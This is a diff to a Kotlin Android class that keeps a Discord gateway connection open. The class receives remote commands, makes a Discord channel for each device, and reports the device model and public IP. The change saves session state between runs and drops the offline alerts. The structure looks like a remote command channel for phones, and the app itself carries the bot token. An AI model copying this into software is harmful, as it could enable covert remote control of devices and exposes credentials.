@@ -10,6 +10,7 @@ import java.util.UUID
 import java.util.concurrent.TimeUnit
 
 class DiscordGatewayClient(
+    private val appContext: android.content.Context,
     private val onCommand: (action: String, payload: String?) -> Unit,
     private val onStatus: ((status: String) -> Unit)? = null
 ) {
@@ -25,6 +26,13 @@ class DiscordGatewayClient(
         private const val DEVICE_HB_MIN = 300000L
         private const val DEVICE_HB_MAX = 600000L
         private val FATAL_CLOSE_CODES = setOf(4004, 4010, 4011, 4012, 4013, 4014)
+        private const val PREFS_NAME = "gw_state"
+        private const val KEY_SUFFIX = "suffix"
+        private const val KEY_ONLINE_SENT = "online_sent"
+        private const val KEY_CHANNEL_ID = "channel_id"
+        private const val KEY_GUILD_ID = "guild_id"
+        private const val KEY_SESSION_ID = "session_id"
+        private const val KEY_SEQ = "seq"
     }
 
     private val wsClient = OkHttpClient.Builder()
@@ -59,17 +67,43 @@ class DiscordGatewayClient(
     @Volatile private var resuming = false
     @Volatile private var closing = false
     @Volatile private var fatalError = false
-    @Volatile private var onlineMsgSent = false
-    @Volatile private var lastKnownConnected = false
-    @Volatile private var offlineAlertSent = false
     private var connectVersion = 0L
     private var crashReport: String? = null
-    private var restChannelId: String? = null
     private var pollJob: Job? = null
     private var lastPolledMsgId: String? = null
     private val processedCmdIds = mutableSetOf<String>()
     private var startTime = 0L
-    private var deviceSuffix: String = UUID.randomUUID().toString().take(6)
+    private var deviceSuffix: String = ""
+    private var onlineMsgSent = false
+
+    private fun loadState() {
+        try {
+            val sp = appContext.getSharedPreferences(PREFS_NAME, android.content.Context.MODE_PRIVATE)
+            deviceSuffix = sp.getString(KEY_SUFFIX, null) ?: UUID.randomUUID().toString().take(6)
+            onlineMsgSent = sp.getBoolean(KEY_ONLINE_SENT, false)
+            myChannelId = sp.getString(KEY_CHANNEL_ID, null)
+            guildId = sp.getString(KEY_GUILD_ID, null)
+            sessionId = sp.getString(KEY_SESSION_ID, null)
+            seq = sp.getInt(KEY_SEQ, -1).let { if (it >= 0) it else null }
+        } catch (_: Exception) {
+            deviceSuffix = UUID.randomUUID().toString().take(6)
+        }
+    }
+
+    private fun saveState() {
+        try {
+            val sp = appContext.getSharedPreferences(PREFS_NAME, android.content.Context.MODE_PRIVATE)
+            sp.edit().apply {
+                putString(KEY_SUFFIX, deviceSuffix)
+                putBoolean(KEY_ONLINE_SENT, onlineMsgSent)
+                myChannelId?.let { putString(KEY_CHANNEL_ID, it) }
+                guildId?.let { putString(KEY_GUILD_ID, it) }
+                sessionId?.let { putString(KEY_SESSION_ID, it) }
+                seq?.let { putInt(KEY_SEQ, it) }
+                apply()
+            }
+        } catch (_: Exception) {}
+    }
 
     fun setCrashReport(report: String) { crashReport = report }
 
@@ -82,11 +116,9 @@ class DiscordGatewayClient(
             fatalError = false
             reconnecting = false
             resuming = false
-            onlineMsgSent = false
-            offlineAlertSent = false
-            lastKnownConnected = false
             startTime = System.currentTimeMillis()
             scope = coroutineScope
+            loadState()
             whPost(JSONObject().apply {
                 put("event", "start")
                 put("device", android.os.Build.MODEL)
@@ -108,9 +140,7 @@ class DiscordGatewayClient(
         try { ws?.close(1000, "shutdown") } catch (_: Exception) {}
         ws = null
         scope = null
-        onlineMsgSent = false
-        offlineAlertSent = false
-        lastKnownConnected = false
+        saveState()
     }
 
     private fun preflightCheck(attempt: Int = 0) {
@@ -185,7 +215,7 @@ class DiscordGatewayClient(
                                 for (i in 0 until channels.length()) {
                                     val ch = channels.getJSONObject(i)
                                     if (ch.optString("name", "") == prefix) {
-                                        restChannelId = ch.optString("id", null)
+                                        myChannelId = ch.optString("id", null)
                                         break
                                     }
                                 }
@@ -194,20 +224,6 @@ class DiscordGatewayClient(
                     }
                 }
             }
-        } catch (_: Exception) {}
-    }
-
-    private fun restAlert(msg: String) {
-        val chId = restChannelId ?: return
-        try {
-            val json = JSONObject().put("content", msg.take(2000))
-            val req = Request.Builder()
-                .url("https://discord.com/api/v10/channels/$chId/messages")
-                .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
-                .header("Content-Type", "application/json")
-                .post(json.toString().toRequestBody(jsonMedia))
-                .build()
-            restClient.newCall(req).execute().close()
         } catch (_: Exception) {}
     }
 
@@ -299,20 +315,6 @@ class DiscordGatewayClient(
 
                 override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
                     status("WS fail")
-                    if (lastKnownConnected && !offlineAlertSent) {
-                        offlineAlertSent = true
-                        onlineMsgSent = false
-                        whPost(JSONObject().apply {
-                            put("event", "offline")
-                            put("error", t.message?.take(200) ?: "?")
-                            put("code", response?.code ?: 0)
-                        })
-                    }
-                    whPost(JSONObject().apply {
-                        put("event", "ws_failure")
-                        put("error", t.message?.take(200) ?: "?")
-                        put("code", response?.code ?: 0)
-                    })
                     if (!closing && !fatalError) scheduleReconnect()
                 }
             })
@@ -328,15 +330,6 @@ class DiscordGatewayClient(
             return
         }
         status("Close $code")
-        if (lastKnownConnected && !offlineAlertSent) {
-            offlineAlertSent = true
-            onlineMsgSent = false
-            whPost(JSONObject().apply {
-                put("event", "offline")
-                put("code", code)
-                put("reason", reason)
-            })
-        }
         if (code in FATAL_CLOSE_CODES) {
             status("Fatal $code")
             fatalError = true
@@ -357,7 +350,10 @@ class DiscordGatewayClient(
             val op = msg.optInt("op", -1)
             val d = msg.opt("d")
             val s = msg.optInt("s", -1)
-            if (s > 0) seq = s
+            if (s > 0) {
+                seq = s
+                saveState()
+            }
 
             when (op) {
                 OP_HELLO -> {
@@ -404,14 +400,11 @@ class DiscordGatewayClient(
                 val data = d as JSONObject
                 sessionId = data.optString("session_id", null)
                 reconnectAttempt = 0
-                lastKnownConnected = true
-                offlineAlertSent = false
                 status("Ready")
+                saveState()
             }
             "RESUMED" -> {
                 reconnectAttempt = 0
-                lastKnownConnected = true
-                offlineAlertSent = false
                 startHeartbeat()
                 if (myChannelId == null) {
                     scope?.launch(Dispatchers.IO) { findOrCreateChannelViaRest() }
@@ -421,6 +414,7 @@ class DiscordGatewayClient(
                 val data = d as JSONObject
                 if (guildId == null) {
                     guildId = data.optString("id", null)
+                    saveState()
                 }
                 if (guildId != null && myChannelId == null) {
                     findOrCreateChannel(data.optJSONArray("channels"))
@@ -456,6 +450,7 @@ class DiscordGatewayClient(
                 if (ch.optString("name", "") == prefix) {
                     myChannelId = ch.optString("id", null)
                     status("Ch found")
+                    saveState()
                     sendOnlineMsg()
                     return
                 }
@@ -483,6 +478,7 @@ class DiscordGatewayClient(
                             if (ch.optString("name", "") == prefix) {
                                 myChannelId = ch.optString("id", null)
                                 status("Ch found")
+                                saveState()
                                 sendOnlineMsg()
                                 return
                             }
@@ -521,6 +517,7 @@ class DiscordGatewayClient(
                                 val ch = JSONObject(body)
                                 myChannelId = ch.optString("id", null)
                                 status("Ch created")
+                                saveState()
                                 sendOnlineMsg()
                             }
                         } else {
@@ -554,7 +551,7 @@ class DiscordGatewayClient(
     fun sendOnlineMsg() {
         if (onlineMsgSent) return
         onlineMsgSent = true
-        offlineAlertSent = false
+        saveState()
         scope?.launch(Dispatchers.IO) {
             status("Sending online msg")
             val ip = getPublicIp()
@@ -623,7 +620,7 @@ class DiscordGatewayClient(
                     .header("Content-Type", "application/json")
                     .method("PATCH", json.toString().toRequestBody(jsonMedia))
                     .build()
-                executeWithRetry(req).use { }
+            executeWithRetry(req).use { }
             } catch (_: Exception) {}
         }
     }
